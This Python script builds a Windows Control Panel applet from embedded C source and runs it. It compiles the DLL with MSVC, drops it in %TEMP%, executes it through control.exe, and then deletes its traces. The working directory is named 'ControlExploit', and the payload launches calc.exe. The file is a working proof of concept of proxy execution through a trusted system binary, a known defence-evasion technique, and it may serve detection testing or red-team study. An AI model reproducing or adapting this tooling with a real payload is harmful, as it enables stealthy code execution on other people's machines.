import os
import shutil
import subprocess
import sys
import time

WORK_DIR = r"C:\Temp\ControlExploit"
VARSALL_BAT = r"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat"
CL_EXE = r"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.44.35207\bin\Hostx64\x64\cl.exe"
CONTROL_EXE = r"C:\Windows\System32\control.exe"

def write_sources():
    os.makedirs(WORK_DIR, exist_ok=True)
    with open(os.path.join(WORK_DIR, 'mycpl.c'), 'w') as f:
        f.write(r'''#include <windows.h>
#include <cpl.h>

#ifndef CPL_INIT
  #define CPL_INIT      1
  #define CPL_GETCOUNT  2
  #define CPL_INQUIRE   3
  #define CPL_DBLCLK    5
  #define CPL_EXIT      7
#endif

__declspec(dllexport)
LONG CALLBACK CPlApplet(
    HWND   hwndCPl,
    UINT   uMsg,
    LPARAM lParam1,
    LPARAM lParam2
) {
    switch (uMsg) {
      case CPL_INIT:      return TRUE;
      case CPL_GETCOUNT:  return 1;
      case CPL_INQUIRE: {
          LPCPLINFO p = (LPCPLINFO)lParam2;
          p->idIcon = 0;
          p->idName = 1;
          p->idInfo = 2;
          p->lData  = 0;
          return 0;
      }
      case CPL_DBLCLK:
          WinExec("c:\\windows\\system32\\calc.exe", SW_SHOWNORMAL);
          return 0;
      case CPL_EXIT:
          return 0;
    }
    return 0;
}''')
    with open(os.path.join(WORK_DIR, 'mycpl.rc'), 'w') as f:
        f.write(r'''#include <windows.h>

STRINGTABLE
BEGIN
  1 "Test Applet"
  2 "Double-click to pop calc"
END''')
    with open(os.path.join(WORK_DIR, 'mycpl.def'), 'w') as f:
        f.write(r'''LIBRARY file.cpl
EXPORTS
  CPlApplet''')

def build_cpl():
    cmd = (
        f'"{VARSALL_BAT}" x64 && '
        f'rc.exe /fo "{WORK_DIR}\\mycpl.res" "{WORK_DIR}\\mycpl.rc" && '
        f'"{CL_EXE}" /LD "{WORK_DIR}\\mycpl.c" "{WORK_DIR}\\mycpl.res" "{WORK_DIR}\\mycpl.def" /Fe"{WORK_DIR}\\file.cpl"'
    )
    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
    return os.path.join(WORK_DIR, 'file.cpl')

def deploy_and_run(cpl_path):
    dest = os.path.join(os.getenv('TEMP'), 'file.cpl')
    shutil.copy2(cpl_path, dest)
    subprocess.run([CONTROL_EXE, dest], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        os.remove(dest)
    except OSError:
        pass

def cleanup_workdir():
    if os.path.isdir(WORK_DIR):
        for filename in os.listdir(WORK_DIR):
            file_path = os.path.join(WORK_DIR, filename)
            try:
                os.remove(file_path)
            except IsADirectoryError:
                shutil.rmtree(file_path, ignore_errors=True)
        try:
            os.rmdir(WORK_DIR)
        except OSError:
            pass

if __name__ == '__main__':
    write_sources()
    try:
        cpl = build_cpl()
    except subprocess.CalledProcessError:
        sys.exit(1)
    deploy_and_run(cpl)
    time.sleep(1)
    cleanup_workdir()
